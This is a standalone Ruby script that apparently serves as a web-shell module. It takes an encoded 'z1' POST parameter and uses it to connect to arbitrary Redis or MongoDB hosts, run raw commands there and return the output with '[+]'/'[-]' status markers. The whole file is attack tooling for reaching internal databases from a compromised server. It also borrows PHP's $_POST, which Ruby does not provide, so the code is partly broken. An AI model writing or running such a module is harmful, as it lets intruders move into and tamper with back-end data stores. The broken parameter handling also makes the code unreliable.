require 'base64'
require 'json'
require 'socket'
require 'timeout'

def handle_redis(ip, port, pass, action, query, timeout_sec)
  Timeout.timeout(timeout_sec) do
    socket = TCPSocket.new(ip, port)
    socket.setsockopt(Socket::IPPROTO_TCP, Socket::TCP_NODELAY, 1)

    if pass && !pass.empty?
      auth_cmd = "*2\r\n$4\r\nAUTH\r\n$#{pass.bytesize}\r\n#{pass}\r\n"
      socket.write(auth_cmd)
      auth_resp = socket.gets
      if !auth_resp || auth_resp.include?('-ERR')
        socket.close
        return "[-] Redis Auth Failed: #{auth_resp ? auth_resp.strip : ''}"
      end
    end

    if action.downcase == 'connect'
      socket.close
      return '[+] SUCCESS_REDIS_CONNECTED -> Ready to send RESP commands.'
    end

    query = 'INFO' if !query || query.empty?

    parts = query.strip.split(/\s+/)
    resp_builder = "*#{parts.size}\r\n"
    parts.each do |part|
      resp_builder += "$#{part.bytesize}\r\n#{part}\r\n"
    end

    socket.write(resp_builder)

    response = ''
    begin
      Timeout.timeout(2) do
        while (chunk = socket.read(8192))
          response += chunk
          break
        end
      end
    rescue Timeout::Error
      # timeout on read
    end

    socket.close
    response
  end
rescue => e
  "[-] Redis error: #{e.message}"
end

def build_mongo_command(db_name, command_name, command_value)
  bson = [0].pack('V')
  bson += "\x10"
  bson += "#{command_name}\x00"
  bson += [command_value].pack('V')
  bson += "\x00"

  bson = [bson.bytesize].pack('V') + bson[4..-1]

  msg = [0].pack('V')
  msg += [12345].pack('V')
  msg += [0].pack('V')
  msg += [2013].pack('V')
  msg += [0].pack('V')
  msg += "#{db_name}.$cmd\x00"
  msg += [0].pack('V')
  msg += [1].pack('V')
  msg += bson

  [msg.bytesize].pack('V') + msg[4..-1]
end

def extract_mongo_text(buffer)
  return '[Empty BSON binary response received]' unless buffer
  sb = ''
  buffer.each_char do |c|
    ascii = c.ord
    if (ascii >= 32 && ascii <= 126) || c == "\n" || c == "\r" || c == "\t"
      sb += c
    end
  end
  sb.empty? ? '[Empty BSON binary response received]' : sb
rescue => e
  "[-] MongoDB operation error: #{e.message}"
end

def handle_mongodb(ip, port, user, pass, action, query, timeout_sec)
  Timeout.timeout(timeout_sec) do
    socket = TCPSocket.new(ip, port)

    if action.downcase == 'connect'
      ping_command = build_mongo_command('admin', 'isMaster', 1)
      socket.write(ping_command)
      buffer = socket.read(4096)
      socket.close

      return '[-] MongoDB connection failed: Response is empty.' unless buffer && !buffer.empty?
      return '[+] SUCCESS_MONGO_CONNECTED -> Successfully connected to MongoDB server.'
    end

    query = 'db.stats()' if !query || query.empty?
    db_name = (user.nil? || user.empty?) ? 'admin' : user
    cmd_bytes = build_mongo_command(db_name, 'ping', 1)

    if query.include?('stats')
      cmd_bytes = build_mongo_command(db_name, 'dbStats', 1)
    elsif query.include?('listCollections')
      cmd_bytes = build_mongo_command(db_name, 'listCollections', 1)
    end

    socket.write(cmd_bytes)
    resp_buffer = socket.read(8192)
    socket.close

    "[+] MongoDB command executed successfully:\n#{extract_mongo_text(resp_buffer)}"
  end
rescue => e
  "[-] MongoDB connection/query error: #{e.message}"
end

def main
  z1 = $_POST['z1']
  return '[-] Missing parameter z1.' if z1.nil? || z1.empty?

  decoded = begin
    Base64.decode64(z1)
  rescue
    nil
  end
  json_str = (decoded.nil? || decoded.empty?) ? z1 : decoded

  config = begin
    JSON.parse(json_str)
  rescue
    nil
  end
  return '[-] Invalid JSON / Base64.' unless config.is_a?(Hash)

  db_type = (config['dbtype'] || 'redis').to_s.downcase
  ip = (config['ip'] || '127.0.0.1').to_s
  port_val = config['port']
  port = (port_val && port_val.to_i > 0) ? port_val.to_i : (db_type == 'mongodb' ? 27017 : 6379)

  user = (config['user'] || '').to_s
  pass = (config['pass'] || '').to_s
  action = (config['action'] || 'connect').to_s.downcase
  query = (config['query'] || '').to_s
  timeout = config['timeout'].to_i > 0 ? config['timeout'].to_i : 10

  if db_type == 'redis'
    handle_redis(ip, port, pass, action, query, timeout)
  elsif db_type == 'mongodb'
    handle_mongodb(ip, port, user, pass, action, query, timeout)
  else
    "[-] Unknown database type: #{db_type}"
  end
end

print main